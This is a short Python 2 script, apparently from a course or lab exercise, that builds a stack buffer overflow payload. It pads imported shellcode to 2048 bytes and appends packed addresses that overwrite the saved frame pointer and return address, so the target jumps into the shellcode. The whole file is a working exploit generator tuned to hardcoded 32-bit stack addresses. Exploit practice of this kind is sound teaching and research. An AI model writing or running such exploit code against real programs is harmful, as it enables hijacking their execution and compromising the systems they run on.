from shellcode import shellcode
from struct import pack

ebp = 0xbffef468
buf = 0xbffeec58
padding = '\x90' * (2048 - len(shellcode))

print shellcode + padding + pack("<I", buf) + pack("<I", ebp + 4)
